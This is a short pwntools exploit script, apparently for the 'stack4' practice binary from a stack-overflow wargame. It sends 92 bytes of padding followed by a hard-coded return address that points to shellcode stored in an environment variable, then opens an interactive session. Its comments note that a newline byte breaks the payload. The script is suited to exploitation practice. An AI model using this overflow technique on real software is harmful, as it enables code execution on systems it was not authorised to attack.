from pwn import *

filename = "stack4"
PATH = '../bin/' + filename

context.log_level = 'debug'

# modify the shellcode address, in the environment variable
shellcode_address = 0xffffccaa

# Craft the payload
payload = b'A'*92
payload += p32(shellcode_address)
# payload += p32(0x000d0a00) # this won't work, need to solve it
# the gets terminates after \n, and i need to give value also after the newline character
p = process(PATH)

p.send(payload)

p.interactive()

p.close()
